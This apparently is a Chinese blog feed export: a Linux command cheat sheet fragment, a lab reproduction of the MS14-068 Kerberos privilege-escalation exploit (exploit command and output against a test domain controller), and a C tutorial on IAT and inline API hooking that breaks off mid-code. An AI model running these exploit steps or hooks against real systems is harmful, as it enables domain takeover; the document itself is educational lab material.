<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkfs /dev/hda1 在hda1分区创建一个文件系统</span><br><span class="line">mke2fs /dev/hda1 在hda1分区创建一个linux ext2的文件系统</span><br><span class="line">mke2fs -j /dev/hda1 在hda1分区创建一个linux ext3(日志型)的文件系统</span><br><span class="line">mkfs -t vfat 32 -F /dev/hda1 创建一个 FAT32 文件系统</span><br><span class="line">fdformat -n /dev/fd0 格式化一个软盘</span><br><span class="line">mkswap /dev/hda3 创建一个swap文件系统</span><br></pre></td></tr></table></figure>
<h3 id="swap-文件系统">20、SWAP 文件系统</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkswap /dev/hda3 创建一个swap文件系统</span><br><span class="line">swapon /dev/hda3 启用一个新的swap文件系统</span><br><span class="line">swapon /dev/hda2 /dev/hdb3 启用两个swap分区</span><br></pre></td></tr></table></figure>
<h3 id="备份">21、备份</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dump -0aj -f /tmp/home0.bak /home 制作一个 <span class="string">&#x27;/home&#x27;</span> 目录的完整备份</span><br><span class="line">dump -1aj -f /tmp/home0.bak /home 制作一个 <span class="string">&#x27;/home&#x27;</span> 目录的交互式备份</span><br><span class="line">restore -<span class="keyword">if</span> /tmp/home0.bak 还原一个交互式备份</span><br><span class="line">rsync -rogpav --delete /home /tmp 同步两边的目录</span><br><span class="line">rsync -rogpav -e ssh --delete /home ip_address:/tmp 通过SSH通道rsync</span><br><span class="line">rsync -az -e ssh --delete ip_addr:/home/public /home/local 通过ssh和压缩将一个远程目录同步到本地目录</span><br><span class="line">rsync -az -e ssh --delete /home/local ip_addr:/home/public 通过ssh和压缩将本地目录同步到远程目录</span><br><span class="line"><span class="built_in">dd</span> bs=1M <span class="keyword">if</span>=/dev/hda  gzip  ssh user@ip_addr <span class="string">&#x27;dd of=hda.gz&#x27;</span> 通过ssh在远程主机上执行一次备份本地磁盘的操作</span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/sda of=/tmp/file1 备份磁盘内容到一个文件</span><br><span class="line">tar -Puf backup.tar /home/user 执行一次对 <span class="string">&#x27;/home/user&#x27;</span> 目录的交互式备份操作</span><br><span class="line">( <span class="built_in">cd</span> /tmp/local/ &amp;amp;&amp;amp; tar c . )  ssh -C user@ip_addr <span class="string">&#x27;cd /home/share/ &amp;amp;&amp;amp; tar x -p&#x27;</span> 通过ssh在远程目录中复制一个目录内容</span><br><span class="line">( tar c /home )  ssh -C user@ip_addr <span class="string">&#x27;cd /home/backup-home &amp;amp;&amp;amp; tar x -p&#x27;</span> 通过ssh在远程目录中复制一个本地目录</span><br><span class="line">tar cf - .  (<span class="built_in">cd</span> /tmp/backup ; tar xf - ) 本地将一个目录复制到另一个地方，保留原有权限及链接</span><br><span class="line">find /home/user1 -name <span class="string">&#x27;*.txt&#x27;</span>  xargs <span class="built_in">cp</span> -av --target-directory=/home/backup/ --parents 从一个目录查找并复制所有以 <span class="string">&#x27;.txt&#x27;</span> 结尾的文件到另一个目录</span><br><span class="line">find /var/log -name <span class="string">&#x27;*.log&#x27;</span>  tar cv --files-from=-  bzip2 &amp;gt; log.tar.bz2 查找所有以 <span class="string">&#x27;.log&#x27;</span> 结尾的文件并做成一个bzip包</span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/hda of=/dev/fd0 bs=512 count=1 做一个将 MBR (Master Boot Record)内容复制到软盘的动作</span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/fd0 of=/dev/hda bs=512 count=1 从已经保存到软盘的备份中恢复MBR内容</span><br></pre></td></tr></table></figure>
<h3 id="光盘">22、光盘</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cdrecord -v gracetime=2 dev=/dev/cdrom -eject blank=fast -force 清空一个可复写的光盘内容</span><br><span class="line">mkisofs /dev/cdrom &amp;gt; cd.iso 在磁盘上创建一个光盘的iso镜像文件</span><br><span class="line">mkisofs /dev/cdrom  gzip &amp;gt; cd_iso.gz 在磁盘上创建一个压缩了的光盘iso镜像文件</span><br><span class="line">mkisofs -J -allow-leading-dots -R -V <span class="string">&quot;Label CD&quot;</span> -iso-level 4 -o ./cd.iso data_cd 创建一个目录的iso镜像文件</span><br><span class="line">cdrecord -v dev=/dev/cdrom cd.iso 刻录一个ISO镜像文件</span><br><span class="line">gzip -dc cd_iso.gz  cdrecord dev=/dev/cdrom - 刻录一个压缩了的ISO镜像文件</span><br><span class="line">mount -o loop cd.iso /mnt/iso 挂载一个ISO镜像文件</span><br><span class="line">cd-paranoia -B 从一个CD光盘转录音轨到 wav 文件中</span><br><span class="line">cd-paranoia -- <span class="string">&quot;-3&quot;</span> 从一个CD光盘转录音轨到 wav 文件中（参数-3）</span><br><span class="line">cdrecord --scanbus 扫描总线以识别scsi通道</span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/hdc  <span class="built_in">md5sum</span> 校验一个设备的<span class="built_in">md5sum</span>编码，例如一张 CD</span><br></pre></td></tr></table></figure>
<h3 id="网络---以太网和-wifi-无线">23、网络 - （以太网和 WIFI
无线）</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ifconfig eth0 显示一个以太网卡的配置</span><br><span class="line">ifup eth0 启用一个 <span class="string">&#x27;eth0&#x27;</span> 网络设备</span><br><span class="line">ifdown eth0 禁用一个 <span class="string">&#x27;eth0&#x27;</span> 网络设备</span><br><span class="line">ifconfig eth0 192.168.1.1 netmask 255.255.255.0 控制IP地址</span><br><span class="line">ifconfig eth0 promisc 设置 <span class="string">&#x27;eth0&#x27;</span> 成混杂模式以嗅探数据包 (sniffing)</span><br><span class="line">dhclient eth0 以dhcp模式启用 <span class="string">&#x27;eth0&#x27;</span></span><br><span class="line">route -n show routing table</span><br><span class="line">route add -net 0/0 gw IP_Gateway configura default gateway</span><br><span class="line">route add -net 192.168.0.0 netmask 255.255.0.0 gw 192.168.1.1 configure static route to reach network <span class="string">&#x27;192.168.0.0/16&#x27;</span></span><br><span class="line">route del 0/0 gw IP_gateway remove static route</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;1&quot;</span> &amp;gt; /proc/sys/net/ipv4/ip_forward activate ip routing</span><br><span class="line">hostname show hostname of system</span><br><span class="line">host www.example.com lookup hostname to resolve name to ip address and viceversa(1)</span><br><span class="line">nslookup www.example.com lookup hostname to resolve name to ip address and viceversa(2)</span><br><span class="line">ip <span class="built_in">link</span> show show <span class="built_in">link</span> status of all interfaces</span><br><span class="line">mii-tool eth0 show <span class="built_in">link</span> status of <span class="string">&#x27;eth0&#x27;</span></span><br><span class="line">ethtool eth0 show statistics of network card <span class="string">&#x27;eth0&#x27;</span></span><br><span class="line">netstat -tup show all active network connections and their PID</span><br><span class="line">netstat -tupl show all network services listening on the system and their PID</span><br><span class="line">tcpdump tcp port 80 show all HTTP traffic</span><br><span class="line">iwlist scan show wireless networks</span><br><span class="line">iwconfig eth1 show configuration of a wireless network card</span><br><span class="line">hostname show hostname</span><br><span class="line">host www.example.com lookup hostname to resolve name to ip address and viceversa</span><br><span class="line">nslookup www.example.com lookup hostname to resolve name to ip address and viceversa</span><br><span class="line">whois www.example.com lookup on Whois database</span><br></pre></td></tr></table></figure>
<p><strong>转载自：</strong>https://www.bugprogrammer.me/2018/05/06/linux-common-command-summary.html</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
  </entry>
  <entry>
    <title>ms14-068 漏洞复现</title>
    <url>/2022/02/23/ms14-068%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="实验环境">1. 实验环境</h2>
<p>在企业环境中域环境管理电脑，可通过拿到域控制管理员账号权限，可控制整个域环境的电脑。</p>
<h3 id="域环境搭建">1、域环境搭建</h3>
<p>域环境搭建省略。</p>
<h3 id="win7加入域">2、win7加入域</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220223105417846-1114532967.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220223105426027-1437053502.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220223105433977-289786438.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220223110346365-798050103.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220223112411994-984585039.png" /></p>
<p><strong>注意：</strong> 域环境下的 administrator
账号可以登录其他所有成员机，但普通域账号没权限登录域控！</p>
<h3 id="漏洞说明">3、漏洞说明</h3>
<p>微软官方解释: &lt;https://docs.microsoft.com/zh-cn/security-
updates/Securitybulletins/2014/ms14-068&gt;</p>
<p>漏洞作用：可将域中一台主机的普通用户提升到域管理员权限</p>
<h3
id="查看目标是否存在ms14-068漏洞">4、查看目标是否存在MS14-068漏洞</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220223175612265-1136463140.png" /></p>
<h2 id="漏洞利用">2. 漏洞利用</h2>
<h3 id="渗透代码">1、渗透代码：</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop/test<span class="comment"># searchsploit ms14-068</span></span><br><span class="line">---------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                          |  Path</span><br><span class="line">                                        | (/usr/share/exploitdb/)</span><br><span class="line">---------------------------------------- ----------------------------------------</span><br><span class="line">Microsoft Windows Kerberos - Privilege  | exploits/windows/remote/35474.py</span><br><span class="line">---------------------------------------- ----------------------------------------</span><br></pre></td></tr></table></figure>
<p><strong>或：<a href="https://www.exploit-db.com/exploits/35474"
class="uri">https://www.exploit-db.com/exploits/35474</a></strong></p>
<h3 id="现成工具">2、现成工具</h3>
<p>Ms14-068.exe：<a
href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068"
class="uri">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a></p>
<p>PSexec：&lt;https://github.com/crupper/Forensics-Tool-
Wiki/blob/master/windowsTools/PsExec64.exe&gt;</p>
<h3 id="生成票据文件二选一">3、生成票据文件（二选一）</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220223171323729-1805956193.png" /></p>
<p><strong>（1）渗透代码生成</strong></p>
<p><strong>需安装的库：<a href="https://github.com/mubix/pykek"
class="uri">https://github.com/mubix/pykek</a></strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:/usr/lib/python2.7<span class="comment"># mv /pykek/* /usr/local/lib/python2.7/dist-packages/</span></span><br><span class="line">root@kali:/usr/lib/python2.7<span class="comment"># ls /usr/local/lib/python2.7/dist-packages/</span></span><br><span class="line">kek  ms14-068.py  pyasn1  pykek</span><br><span class="line">root@kali:~/Desktop/test<span class="comment"># python /root/Desktop/test/35474.py  -u win7@lab.com -s S-1-5-21-2143070836-2917229441-1237987123-1115 -d 10.10.10.130 </span></span><br><span class="line">Password: </span><br><span class="line">  [+] Building AS-REQ <span class="keyword">for</span> 10.10.10.130... Done!</span><br><span class="line">  [+] Sending AS-REQ to 10.10.10.130... Done!</span><br><span class="line">  [+] Receiving AS-REP from 10.10.10.130... Done!</span><br><span class="line">  [+] Parsing AS-REP from 10.10.10.130... Done!</span><br><span class="line">  [+] Building TGS-REQ <span class="keyword">for</span> 10.10.10.130... Done!</span><br><span class="line">  [+] Sending TGS-REQ to 10.10.10.130... Done!</span><br><span class="line">  [+] Receiving TGS-REP from 10.10.10.130... Done!</span><br><span class="line">  [+] Parsing TGS-REP from 10.10.10.130... Done!</span><br><span class="line">  [+] Creating ccache file <span class="string">&#x27;TGT_win7@lab.com.ccache&#x27;</span>... Done!</span><br></pre></td></tr></table></figure>
<p><strong>注意：-d
指定域控制器名称/IP【除非kali也指定同一个DNS（域控），否则需要写入IP地址】</strong></p>
<p><strong>（2）Ms14-068.exe生成</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220223171335212-412517861.png" /></p>
<h3 id="实测"><strong>4、实测</strong></h3>
<p><strong>（1）利用前</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220223171737919-466828795.png" /></p>
<p><strong>（2）查看 /
删除当前域机器的票证：Kerberos::list/purge</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220223171521493-1591310793.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220223171534326-1663932911.png" /></p>
<p><strong>（3）结果</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220223171705520-1911342160.png" /></p>
<p><strong>上面是将与普通域账号提权至administrator权限，同理可将 win7
本地管理员账号提权至域控administrator权限，如：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220223174209762-1957879803.png" /></p>
<p><strong>备注：admin$共享的开启</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220223171927496-1025085208.png" /></p>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>漏洞复现</category>
        <category>提权</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>HOOK 技术</title>
    <url>/2023/02/24/hook-%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<h2 id="原理">1. 原理</h2>
<h3 id="iat-hook">1、IAT Hook</h3>
<p>IAT即PE文件导入表，存放PE文件执行时要调用的函数的地址，我们将这个表中要hook的函数地址改成我们的函数地址（在此之前要把这个函数先加载到进程空间），当程序调用原函数时，会在IAT中找到对应函数的地址，但由于该地址被我们修改了，所以最终导致调用我们自定义的函数执行，即为IAT
Hook。</p>
<h3 id="inline-hook">2、Inline Hook</h3>
<p>IAT
Hook是对所调用模块中API地址的修改,当API调用时会执行我们的函数，而Inline
Hook是直接利用JMP跳转指令跳到我们的函数地址去执行我们自定义的函数，JMP的是实现在函数的内部，我们需要保存JMP会覆盖的函数内容，计算跳转的偏移距离及修改内存数据等，另外，JMP跳转执行完我们的函数后环需要恢复操作等，这与IAT
Hook相比要困难的多。</p>
<h2 id="示例">2. 示例</h2>
<h3 id="示例说明">1、示例说明</h3>
<p>IAT  Hook,实现了对user32.dll模块中的GetTopWindow函数的挂钩，即将GetTopWindow原地址先改成自定义函数MyGetTopWindow的地址，此时再调用GetTopWindow时会执行MyGetTopWindow函数（函数实现蜂鸣器响1s和弹出提示框），在执行完后，再利用IAT
UnHook函数恢复原函数地址，再次调用GetTopWindow函数测试是否已恢复（恢复：不弹框，反之：恢复失败）。</p>
<p>Inline
Hook，实现对user32.dll模块中的MessageBoxA函数的Hook，即调用MessageBoxA函数时让它跳转到自定义的MyMessageBoxA函数（函数实现Beep
1s和弹出一个MessageBox框）处并执行该函数，在执行完后再跳回原地址执行MessageBoxA函数（函数实现弹框，检测是否恢复）。</p>
<h3 id="iat-hook-流图">2、IAT Hook 流图</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/02/img_63f8c3988fc14.png" /></p>
<h3 id="inline-hook-流图">3、Inline Hook 流图</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/02/img_63f8c3b5646e4.png" /></p>
<h3 id="iat-hook-代码">4、IAT Hook 代码</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IATHOOK_DATA</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DWORD dwvalueaddr;<span class="comment">//函数地址的地址</span></span><br><span class="line">    DWORD dworiginvalue;<span class="comment">//原始值</span></span><br><span class="line">    DWORD dwnewvalue;<span class="comment">//新值</span></span><br><span class="line">&#125;IATHOOK_DATA, * PIATHOOK_DATA;</span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">IATHook</span><span class="params">(CHAR szdllname[], CHAR szfuncname[], PIATHOOK_DATA pIATHOOK_DATA)</span>;<span class="comment">//参数：目标模块名，目标函数，自定义函数</span></span><br><span class="line">DWORD <span class="title function_">IATUnHook</span><span class="params">(PIATHOOK_DATA pIATHOOK_DATA)</span>;</span><br><span class="line">HWND WINAPI <span class="title function_">MyGetTopWindow</span><span class="params">(HWND hwnd)</span>;</span><br><span class="line">IATHOOK_DATA IATHookData;</span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">WinMain</span><span class="params">(__in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, __in_opt LPSTR lpCmdLine, __in <span class="type">int</span> nShowCmd)</span></span><br><span class="line">&#123;</span><br><span class="line">    IATHookData.dwnewvalue = (DWORD)MyGetTopWindow;<span class="comment">//获取自定义函数的地址</span></span><br><span class="line">    IATHook(<span class="string">&quot;user32.dll&quot;</span>, <span class="string">&quot;GetTopWindow&quot;</span>, &amp;IATHookData);<span class="comment">//获取的是user32.dll中GetTopWindow函数的地址</span></span><br><span class="line">    GetTopWindow(<span class="literal">NULL</span>);<span class="comment">//调用gettopwindow函数，由于上一步把地址修改了此时会调用自定义的MyGetTopWindow函数</span></span><br><span class="line">    IATUnHook(&amp;IATHookData);<span class="comment">//恢复操作原来的地址</span></span><br><span class="line">    GetTopWindow(<span class="literal">NULL</span>);<span class="comment">//再次调用验证是否恢复</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">HWND</span><span class="params">(WINAPI* GETTOPWINDOW)</span><span class="params">(HWND hwnd)</span>;</span><br><span class="line">HWND WINAPI <span class="title function_">MyGetTopWindow</span><span class="params">(HWND hwnd)</span><span class="comment">//自定义函数</span></span><br><span class="line">&#123;</span><br><span class="line">    GETTOPWINDOW origingettopwindow = (GETTOPWINDOW)IATHookData.dworiginvalue;</span><br><span class="line">    Beep(<span class="number">300</span>, <span class="number">1000</span>);<span class="comment">//让蜂鸣器响一秒</span></span><br><span class="line">    MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;test&quot;</span>, <span class="string">L&quot;IAT HOOK&quot;</span>, MB_OK);<span class="comment">//L是让char*的实参和LPCWSTR的形参兼容</span></span><br><span class="line">    <span class="keyword">return</span> origingettopwindow(hwnd);</span><br><span class="line">&#125;</span><br><span class="line">DWORD <span class="title function_">IATHook</span><span class="params">(CHAR szdllname[], CHAR szfuncname[], PIATHOOK_DATA pIATHOOK_DATA)</span></span><br><span class="line">&#123;</span><br><span class="line">    DWORD dwbaseaddr;<span class="comment">//待Hook的模块基址</span></span><br><span class="line">    PIMAGE_DOS_HEADER pdosheader;</span><br><span class="line">    PIMAGE_NT_HEADERS pntheader;</span><br><span class="line">    PIMAGE_OPTIONAL_HEADER poptheater;</span><br><span class="line">    PIMAGE_THUNK_DATA pthunk, pIAT;</span><br><span class="line">    PIMAGE_IMPORT_DESCRIPTOR pImportdes;</span><br><span class="line">    DWORD dwindex;</span><br><span class="line">    DWORD dworiginprotect;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (szdllname == <span class="literal">NULL</span>  szfuncname == <span class="literal">NULL</span>  pIATHOOK_DATA == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR_INVALID_PARAMETER;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//获取当前程序模块的基地址,dwbaseaddr是读取到的PE文件缓冲区</span></span><br><span class="line">    dwbaseaddr = (DWORD)GetModuleHandle(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == dwbaseaddr)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> GetLastError();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//DOS头</span></span><br><span class="line">    pdosheader = (PIMAGE_DOS_HEADER)dwbaseaddr;</span><br><span class="line">    <span class="comment">//NT头</span></span><br><span class="line">    pntheader = (PIMAGE_NT_HEADERS)(dwbaseaddr + pdosheader-&gt;e_lfanew);<span class="comment">//偏移+dwbaseaddr,NT头首地址</span></span><br><span class="line">    poptheater = &amp;(pntheader-&gt;OptionalHeader);</span><br><span class="line">    <span class="comment">//定位导入表</span></span><br><span class="line">    pImportdes = (PIMAGE_IMPORT_DESCRIPTOR)(dwbaseaddr + poptheater-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//先找user32.dll,再找GetTopWindow函数地址</span></span><br><span class="line">    <span class="keyword">while</span> (pImportdes-&gt;FirstThunk)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (_stricmp((CHAR*)(dwbaseaddr + pImportdes-&gt;Name), szdllname))<span class="comment">//遍历查找user32.dll（通过导入表数组元素中的Name字段判断当前对应的DLL是哪个）</span></span><br><span class="line">        &#123;</span><br><span class="line">            pImportdes++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//注意：程序的导入表处理完毕后OriginalFirstThunk可能是无效的，不能再根据名称来查找，而是遍历FirstThunk直接根据地址判断</span></span><br><span class="line">        pIAT = (PIMAGE_THUNK_DATA)(dwbaseaddr + pImportdes-&gt;FirstThunk);</span><br><span class="line">        <span class="keyword">if</span> (pImportdes-&gt;OriginalFirstThunk)</span><br><span class="line">        &#123;</span><br><span class="line">            pthunk = (PIMAGE_THUNK_DATA)(dwbaseaddr + pImportdes-&gt;OriginalFirstThunk);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            pthunk = pIAT;</span><br><span class="line">        &#125;</span><br><span class="line">        dwindex = <span class="number">0</span>;<span class="comment">//初始化，作用看后面</span></span><br><span class="line">        <span class="comment">//遍历找到user32.dll中对应GetTopWindow函数的ThunkDate指针</span></span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            dwindex = *(DWORD*)pthunk;<span class="comment">//获取地址</span></span><br><span class="line">            <span class="keyword">if</span> (dwindex != <span class="number">0</span>)<span class="comment">//判断下有没有成功</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> ((dwindex &amp; IMAGE_ORDINAL_FLAG) == <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">strcmp</span>((PCHAR)(dwbaseaddr + dwindex + <span class="number">2</span>), szfuncname) == <span class="number">0</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">//保存原始信息（后面恢复时需用）</span></span><br><span class="line">                        pIATHOOK_DATA-&gt;dwvalueaddr = (DWORD)pIAT;</span><br><span class="line">                        pIATHOOK_DATA-&gt;dworiginvalue = *(DWORD*)pIAT;</span><br><span class="line">                        <span class="comment">//通常情况下导入表所在内存页都是只读的，因此需要先修改内存页的属性为可读可写</span></span><br><span class="line">                        VirtualProtect(pIAT, <span class="number">4</span>, PAGE_EXECUTE_READWRITE, &amp;dworiginprotect);</span><br><span class="line">                        <span class="comment">/*VirtualProtect函数参数说明：</span></span><br><span class="line"><span class="comment">                            指向要更改其访问保护属性的页面区域的基址,</span></span><br><span class="line"><span class="comment">                            指定访问保护属性要更改的区域的大小（以字节为单位），</span></span><br><span class="line"><span class="comment">                            指定新的访问保护，指向功能设置为页面指定区域中第一页的先前访问保护值的变量。</span></span><br><span class="line"><span class="comment">                            如果此参数为NULL或不指向有效变量，则该函数将失败。*/</span></span><br><span class="line">                        *(DWORD*)pIAT = pIATHOOK_DATA-&gt;dwnewvalue;<span class="comment">//修改地址</span></span><br><span class="line">                        VirtualProtect(pIAT, <span class="number">4</span>, dworiginprotect, &amp;dworiginprotect);<span class="comment">//恢复内存页的属性</span></span><br><span class="line">                        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//下一函数</span></span><br><span class="line">            pthunk++;</span><br><span class="line">            pIAT++;</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//下一模块</span></span><br><span class="line">        pImportdes++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">IATUnHook</span><span class="params">(PIATHOOK_DATA pIATHOOK_DATA)</span><span class="comment">//恢复操作</span></span><br><span class="line">&#123;</span><br><span class="line">    MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;test_恢复！&quot;</span>, <span class="string">L&quot;IAT UNHOOK&quot;</span>, MB_OK);<span class="comment">//L是让char*的实参和LPCWSTR的形参兼容</span></span><br><span class="line">    DWORD dworiginprotect;</span><br><span class="line">    VirtualProtect((PVOID)pIATHOOK_DATA-&gt;dwvalueaddr, <span class="number">4</span>, PAGE_EXECUTE_READWRITE, &amp;dworiginprotect);<span class="comment">//修改权限</span></span><br><span class="line">    *(DWORD*)pIATHOOK_DATA-&gt;dwvalueaddr = pIATHOOK_DATA-&gt;dworiginvalue;<span class="comment">//恢复为原来的地址</span></span><br><span class="line">    VirtualProtect((PVOID)pIATHOOK_DATA-&gt;dwvalueaddr, <span class="number">4</span>, dworiginprotect, &amp;dworiginprotect);<span class="comment">//恢复内存页的属性</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="inline-hook-代码">5、Inline Hook 代码</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">INLINEHOOK_DATA</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    BYTE byHookCode[<span class="number">5</span>];  <span class="comment">//覆盖函数的前5字节</span></span><br><span class="line">    BYTE byOriginCode[<span class="number">5</span>];<span class="comment">//原函数前5字节</span></span><br><span class="line">    PVOID pfFuncAddr;<span class="comment">//被hook的地址</span></span><br><span class="line">    PVOID pfTargetFunc; <span class="comment">//挂接到函数地址</span></span><br><span class="line">&#125;INLINEHOOK_DATA, * PINLINEHOOK_DATA;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(WINAPI* MESSAGEBOX)</span><span class="params">(HWND hwnd, LPSTR lpText, LPSTR lpCaption, UINT uType)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">InlineHook</span><span class="params">(PINLINEHOOK_DATA pInlineHookData)</span>;</span><br><span class="line">INT WINAPI <span class="title function_">MyMessageBoxA</span><span class="params">(HWND hwnd, LPSTR lpText, LPSTR lpCaption, UINT uType)</span>;</span><br><span class="line">VOID <span class="title function_">Proxy</span><span class="params">()</span>;</span><br><span class="line">PVOID <span class="title function_">SearchAddr</span><span class="params">(PVOID pStart, DWORD dwSize, DWORD dwAddrCodeMark)</span>;</span><br><span class="line">INLINEHOOK_DATA InlineHookData;</span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">WinMain</span><span class="params">(__in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, __in_opt LPSTR lpCmdLine, __in <span class="type">int</span> nShowCmd)</span></span><br><span class="line">&#123;</span><br><span class="line">    InlineHookData.pfFuncAddr = GetProcAddress(GetModuleHandleA(<span class="string">&quot;user32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>);<span class="comment">//GetProcAddress函数返回user32.dll模块中MessageBoxA函数的地址。</span></span><br><span class="line">    InlineHookData.pfTargetFunc = MyMessageBoxA;<span class="comment">//自定义函数地址</span></span><br><span class="line">    InlineHook(&amp;InlineHookData);</span><br><span class="line">    MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;test—恢复后调用MessageBoxA&quot;</span>, <span class="string">&quot;Inline Hook&quot;</span>, MB_OK);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">INT WINAPI <span class="title function_">MyMessageBoxA</span><span class="params">(HWND hwnd, LPSTR lpText, LPSTR lpCaption, UINT uType)</span></span><br><span class="line">&#123;</span><br><span class="line">    DWORD dwRet;</span><br><span class="line">    Beep(<span class="number">300</span>, <span class="number">1000</span>);<span class="comment">//蜂鸣器</span></span><br><span class="line">    MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;test—HOOK执行MessageBox&quot;</span>, <span class="string">L&quot;Inline Hook&quot;</span>, MB_OK);<span 